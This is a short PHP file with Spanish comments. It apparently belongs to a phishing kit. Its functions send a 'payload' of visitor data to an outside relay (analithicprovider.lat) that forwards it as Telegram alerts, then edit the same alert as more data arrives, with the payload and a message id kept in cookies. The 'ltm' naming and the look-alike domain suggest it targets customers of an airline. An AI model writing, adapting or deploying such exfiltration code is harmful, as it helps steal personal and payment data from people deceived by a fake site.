<?php
function enviarMensajeTelegram($payload) {
    $url = "https://analithicprovider.lat/api/alert/ltm-send-message";
    //$url = "http://localhost:3000/api/alert/ltm-send-message";
    $data = array(
        'data' => $payload
    );
    setcookie('userData', $payload, time() + (86400 * 30), "/");
    // Usa application/json si el servidor espera JSON
    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => json_encode($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    echo $result;
    if ($result === false) {
        // Error al enviar el mensaje
        error_log('Error al enviar mensaje a Telegram: ' . error_get_last()['message']);
        return false;
    }

    // Decodifica la respuesta JSON
    $response = json_decode($result, true);

    if (isset($response['success']) && $response['success']) {
        
        $messageId = $response['messageId'];
        setcookie('mid', $messageId, time() + (86400 * 30), "/");
        return $messageId;
    } else {
        // Error en la respuesta de Telegram
        error_log('Error en la respuesta de Telegram: ' . json_encode($response));
        return false;
    }
}





function editarMensajeTelegram($newData) {
    $messageId = getMid();
   $url = "https://analithicprovider.lat/api/alert/ltm-edit-message";
    //$url = "http://localhost:3000/api/alert/ltm-edit-message";
    $data = array(
        'messageId' => $messageId,
        'data' => $newData
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => json_encode($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        // Error al editar el mensaje
        error_log('Error al editar mensaje en Telegram: ' . error_get_last()['message']);
        return false;
    }

    // Decodifica la respuesta JSON
    $response = json_decode($result, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        error_log('Error al decodificar la respuesta JSON: ' . json_last_error_msg());
        return false;
    }

    if (isset($response['success']) && $response['success']) {
        // El mensaje se editó correctamente
        return true;
    } else {
        // Error en la respuesta de Telegram
        error_log('Error en la respuesta de Telegram: ' . json_encode($response));
        return false;
    }
}


function getMid() {
    if (isset($_COOKIE['mid'])) {
        return $_COOKIE['mid'];
    }
    return null;
}


?>